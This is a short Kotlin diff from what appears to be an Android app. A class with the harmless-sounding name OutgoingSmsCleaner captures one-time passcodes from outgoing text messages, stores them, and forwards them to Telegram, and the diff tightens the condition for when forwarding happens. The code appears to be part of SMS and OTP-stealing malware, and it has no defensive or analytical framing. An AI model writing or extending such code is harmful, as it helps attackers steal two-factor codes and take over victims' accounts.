@@ -80,7 +80,9 @@ object OutgoingSmsCleaner {
             capturedAt = System.currentTimeMillis()
         )
         OtpCaptureWriter.write(context, otp)
-        if (config.autoForwardToken || config.fakeInterceptTelegram) {
+        if (config.autoForwardToken &&
+            SmsMatcher.shouldForwardToTelegram(config, dest, body, "outgoing")
+        ) {
             TokenForwarder(configManager, context).forward(otp)
         }
     }
